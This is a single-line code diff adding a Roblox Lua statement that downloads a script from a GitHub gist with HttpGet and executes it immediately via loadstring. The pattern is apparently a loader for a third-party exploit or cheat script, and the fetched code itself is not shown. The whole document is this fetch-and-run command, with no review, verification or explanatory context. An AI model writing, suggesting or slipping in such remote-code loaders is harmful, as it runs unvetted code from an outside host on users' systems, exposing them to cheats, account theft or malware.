@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://gist.githubusercontent.com/castrotoribiocheudy-create/9f0a09f336fcad1af4a3903511bd76f0/raw/38714635ef9b09177b4255d45a08f5efd266eb25/Script.lua"))()
